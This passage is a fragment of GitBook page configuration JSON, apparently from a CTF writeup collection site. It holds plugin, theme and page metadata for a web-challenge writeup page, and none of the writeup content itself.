fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":true},"sitemap":{"hostname":"https://www.ctfwp.com/"},"copy-code-button":{},"sharing":{"facebook":false,"twitter":false,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":[]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"anchors":{},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"Yunen <yunen@cqu.edu.cn>","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"CTF Writeup","links":{"sharing":{"all":false,"facebook":false,"google":false,"twitter":false,"weibo":false},"sidebar":{"首页":"/"}},"gitbook":"*","description":"Collect writeups of CTF.","extension":null},"file":{"path":"articals/shiyanbar_web.md","mtime":"2019-04-23T06:37:12.673Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-04-24T08:48:49.502Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"实验吧web部分","level":"1.5.6","depth":2,"next":{"title":"加入我们完善网站!","level":"1.6","depth":1,"path":"help.md","ref":"help.md","articles":[]},"previous":{"title":"2019西湖论剑预选赛","level":"1.5.5","depth":2,"path":"articals/xihulunjian2019.md","ref":"articals/xihulunjian2019.md","articles":[]},"dir":"ltr"},"config":{"plugins":["expandable-chapters","splitter","anchors","copy-code-button","github","highlight","sitemap","analytics","search-plus","anchor-navigation-ex","fancybox"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"fancybox":{"helpers":{"buttons":{}}},"github":{"url":"https://github.com/HackerYunen/CTFWP"},"analytics":{"baidu":"2b55d8e2dd73ae8a37978eec7e143a7c"},"splitter":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":true},"sitemap":{"hostname":"https://www.ctfwp.com/"},"copy-code-button":{},"sharing":{"facebook":false,"twitter":false,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":[]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"anchors":{},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"Yunen <yunen@cqu.edu.cn>","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"CTF Writeup","links":{"sharing":{"all":false,"facebook":false,"google":false,"twitter":false,"weibo":false},"sidebar":{"首页":"/"}},"gitbook":"*","description":"Collect writeups of CTF.","extension":null},"file":{"path":"articals/shiyanbar_web.md","mtime":"2019-04-23T06:37:12.673Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-04-26T12:13:29.773Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
